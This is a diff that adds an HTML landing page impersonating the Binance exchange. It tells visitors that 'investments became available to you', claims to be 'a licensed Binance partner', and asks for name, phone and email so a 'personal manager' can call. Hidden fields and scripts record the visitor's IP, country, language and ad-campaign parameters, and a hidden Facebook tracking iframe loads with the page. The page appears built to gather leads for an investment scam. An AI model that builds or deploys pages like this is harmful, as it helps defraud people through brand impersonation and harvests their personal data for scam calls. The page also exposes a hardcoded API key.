@@ -1,0 +1,259 @@
+<!DOCTYPE html>
+<html lang="ru">
+
+<head>
+<title>Binance Platform</title>
+   <meta charset="UTF-8">
+   <meta name="format-detection" content="telephone=no">
+   <link rel="stylesheet" href="css/style.css">
+    <link rel="stylesheet" href="css/intlTelInput.min.css">
+   <link rel="shortcut icon" href="favicon.ico">
+   <!-- <meta name="robots" content="noindex, nofollow"> -->
+   <!-- <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0"> -->
+   <meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+   <style>
+	   .iti__country-name, .iti__flag-box {
+	   	color:black;
+	   }
+
+	input#phone::placeholder {
+	    font-family: Arial, "Helvetica Neue", Helvetica, sans-serif;
+	    font-size: 14px;
+	}
+   </style>
+</head>
+
+<body>
+
+   <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+       <script src="form.js"></script>
+            <form class="layout" id="mainForm" action='form.js' method='post'>
+                <input type="hidden" name="iso" id="iso" value="" />
+                <input type="hidden" name="ip" id="ip" value="">
+
+                <input type="hidden" name="subid" value="" />
+                <input type="hidden" name="expid" value="">
+                <input type="hidden" name="campaign" value="">
+                <input type="hidden" name="referrer" value="">
+                <input type="hidden" name="source" value="">
+                <input type="hidden" name="medium" value="">
+                <input type="hidden" name="content" value="">
+                <input type="hidden" name="term" value="">
+                <input type="hidden" name="timezone" value="">
+                <input type="hidden" name="lang" id="lang" value="">
+   <div class="wrapper">
+<header class="header">
+	<div class="container">
+		<div class="header__row">
+         
+			<!-- 
+				html меню с иконкой бургера
+				<div class="header__menu menu">
+					<div class="menu__icon icon-menu">
+						<span></span>
+						<span></span>
+						<span></span>
+					</div>
+					<nav class="menu__body">
+						<ul class="menu__list">
+							<li><a href="" class="menu__link"></a></li>
+						</ul>
+					</nav>
+				</div>
+			 -->
+		</div>
+	</div>
+</header>      <div class="dooblestak">
+         <div class="dooblestak__content">
+            <div class="dooblestak__logo">
+               <div class="dooblestak__logoimg">
+                  <img src="h1/logoimg.svg" alt="">
+               </div>
+               <div class="dooblestak__logotext">
+                  <img src="h1/Group.svg" alt="">
+               </div>
+            </div>
+            <div class="dooblestak__fonup">
+               <img src="h1/verhniy.svg" alt="">
+            </div>
+            <div class="dooblestak__fonsredniy">
+               <img src="h1/sredniy.svg" alt="">
+            </div>
+            <div class="dooblestak__fonniz">
+               <img src="h1/nihzniy.svg" alt="">
+            </div>
+            <div class="dooblestak__ugolniki">
+               <img src="h1/3gol.png" alt="">
+            </div>
+            <div class="dooblestak__bigblock">
+               <div class="dooblestak__blockcontent">
+                  <div class="dooblestak__h1">Congratulations! </br>
+                     Investments on the Binance Platform became available to you.</div>
+                  <div class="dooblestak__h2">Fill form and wait for a call from your personal manager</div>
+                  <div class="dooblestak__name">
+                     <div class="dooblestak__inname">
+                        <div class="dooblestak__firstname">Name</div>
+                     </div>
+                     <div class="dooblestak__inputname">
+                        <div class="dooblestak__infirstname">
+                           <input  tabindex="1" name="firstname" type="text" />
+                        </div>
+                     </div>
+                  </div>
+                  <div class="dooblestak__lastnn">
+                     <div class="dooblestak__inname">
+                        <div class="dooblestak__lastname">Last Name</div>
+                     </div>
+                     <div class="dooblestak__inputname">
+                        <div class="dooblestak__inputlastname">
+                           <input  tabindex="2" name="lastname" type="text" />
+                        </div>
+                     </div>
+                  </div>
+                  <div class="dooblestak__phone">
+                     <div class="dooblestak__inname">
+                        <div class="dooblestak__phonenamp">Phone number</div>
+                     </div>
+                     <div class="dooblestak__inputname">
+                        <div class="dooblestak__inputphone"><input tabindex="3" name="phone" id="phone" type="tel" value=""/></div>
+                     </div>
+                  </div>
+                  <div class="dooblestak__email">
+                     <div class="dooblestak__inname">
+                        <div class="dooblestak__firstemail">Email</div>
+                     </div>
+                     <div class="dooblestak__inputname">
+                        <div class="dooblestak__lastemail"><input  tabindex="3" name="email" type="text" /></div>
+                     </div>
+                  </div>
+
+                  <div class="dooblestak__h3">*We are a licensed Binance partner and provide services financial analytics.</div>
+                  <div class="dooblestak__button">
+                        <button name="submit" type="submit">Start earning</button>
+                  </div>
+                  <div class="dooblestak__checkpoint">
+                     <div class="dooblestak__box"><input type="checkbox" value="Start" /></div>
+                     <div class="dooblestak__boxtext">I agree to the <a href="">privacy policy</a></div>
+                  </div>
+               </div>
+            </div>
+         </div>
+      </div>
+<footer class="footer">
+	<div class='container'>
+		<div class="footer__row">
+			</form>
+		</div>
+	</div>
+</footer>   </div>
+<div class="popup">
+	<div class="popup-table table">
+		<div class="cell">
+			<div class="popup-content">
+				<div class="popup-close"></div>
+				<div class="popup__title"></div>
+				<div class="popup__txt"></div>
+				<form action="#" class="popup-form form">
+					<div class="form-input">
+						<input autocomplete="off" type="text" name="form[]" data-value="" class="input" />
+					</div>
+					<div class="form-input">
+						<input autocomplete="off" type="text" name="form[]" data-value="" class="input req email" />
+					</div>
+					<div class="form-input">
+						<input autocomplete="off" type="text" name="form[]" data-value="" class="input req" />
+					</div>
+					<div class="form-button">
+						<button type="submit" class="form__btn btn fw"></button>
+					</div>
+				</form>
+			</div>
+		</div>
+	</div>
+</div>
+<div class="popup popup-video">
+	<div class="popup-table table">
+		<div class="cell">
+			<div class="popup-close"></div>
+			<div class="popup-video__value video"></div>
+		</div>
+	</div>
+
+<script src="js/vendors.js"></script>
+<script src="js/main.js"></script>
+<script src="js/custom.js" ></script>
+<script src="js/intlTelInput.min.js"></script>
+<script>
+      var input = document.querySelector("#phone");
+      var iti = window.intlTelInput (input, {
+        initialCountry: "auto",
+        separateDialCode: "true",
+          geoIpLookup: function(success, failure) {
+            $.get("https://ipinfo.io", function() {}, "jsonp").always(function(resp) {
+              var countryCode = (resp && resp.country) ? resp.country : "us";
+              success(countryCode);
+            });
+          },
+        utilsScript: 'js/utils.js'
+      });
+</script>
+
+
+       <script>
+                $.get("https://ipapi.co/json/?key=HGVen13xQubUzupRPOGhHFpEymeFBFBQLyJD4RC0xgK2K3W5EI/", function(data) {
+                    document.getElementById('iso').value = data.country;
+                    document.getElementById('ip').value = data.ip;
+                });
+            </script>
+            <script>
+                function getUrlParameter(sParam) {
+                    var sPageURL = window.location.search.substring(1);
+                    var sURLVariables = sPageURL.split('&');
+                    for (var i = 0; i < sURLVariables.length; i++) {
+                        var sParameterName = sURLVariables[i].split('=');
+                        if (sParameterName[0] == sParam) {
+                            return sParameterName[1];
+                        }
+                    }
+                }
+                window.onload = function() {
+                    if (getUrlParameter('sub_id_8') !== undefined) {
+                        var body = document.getElementsByTagName('body')[0];
+                        var fb_frame = document.createElement('iframe');
+                        fb_frame.src = 'https://www.facebook.com/tr?id=' + getUrlParameter('sub_id_8') + '&ev=PageView';
+                        fb_frame.style.width = '1px';
+                        fb_frame.style.height = '1px';
+                        fb_frame.style.display = 'none';
+                        body.append(fb_frame);
+                    }
+                }
+
+                $.get("https://ipapi.co/json/?key=HGVen13xQubUzupRPOGhHFpEymeFBFBQLyJD4RC0xgK2K3W5EI/", function(data) {
+                    document.getElementById('iso').value = data.country;
+                    document.getElementById('ip').value = data.ip;
+                    document.getElementById('lang').value = data.languages.split("-")[0]
+                });
+
+
+
+
+        </script>
+        <script>
+	let s = window.location.search
+	let url = new URL (window.location.href)
+	let params = new URLSearchParams (url.search)
+  
+	document.querySelectorAll("a").forEach (item => {
+	  let utmp = new URL (item.href)
+	  params.forEach ((val,idx) => {
+		utmp.searchParams.append (idx, val)
+	  })
+  
+	  item.href = utmp.href
+	})
+  </script>
+</body>
+
+</html>
